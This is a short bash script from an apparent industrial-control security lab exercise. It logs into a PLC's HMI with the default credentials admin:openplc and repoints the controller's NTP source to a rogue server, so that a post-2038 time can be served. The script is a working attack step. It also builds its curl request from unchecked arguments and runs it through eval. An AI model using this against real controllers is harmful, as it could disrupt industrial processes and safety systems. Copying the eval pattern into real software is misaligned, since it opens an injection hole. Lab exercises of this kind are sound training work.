#!/usr/bin/env bash
# pivot.sh — Part 8, Exercise 3: the remote pivot (no console access needed).
#
# The HMI's /api/config is auth-gated, but the firmware ships the DEFAULT
# credentials admin:openplc (CWE-798 / CWE-1393). Anyone who knows them can
# repoint the controller's network time source over HTTP. This wraps the one
# long curl so you see the exact request without typing it.
#
#   ./ntp-aitm/pivot.sh                      # repoint NTP -> 127.0.0.1:1123 (the rogue server)
#   ./ntp-aitm/pivot.sh 10.0.0.9 123         # repoint to an arbitrary host:port
set -euo pipefail
HOST="${HMI:-127.0.0.1:8080}"
NTP="${1:-127.0.0.1}"
PORT="${2:-1123}"
CMD="curl -s -u admin:openplc -X POST 'http://$HOST/api/config?ntp=$NTP&ntp_port=$PORT'"
echo "+ $CMD"
echo
eval "$CMD"
echo
echo "(the controller's time source is now $NTP:$PORT — re-run 'ntpsync auto 127.0.0.1 3'"
echo " in the plc> console and ./ntp-aitm/arm.sh to serve a post-2038 time)"
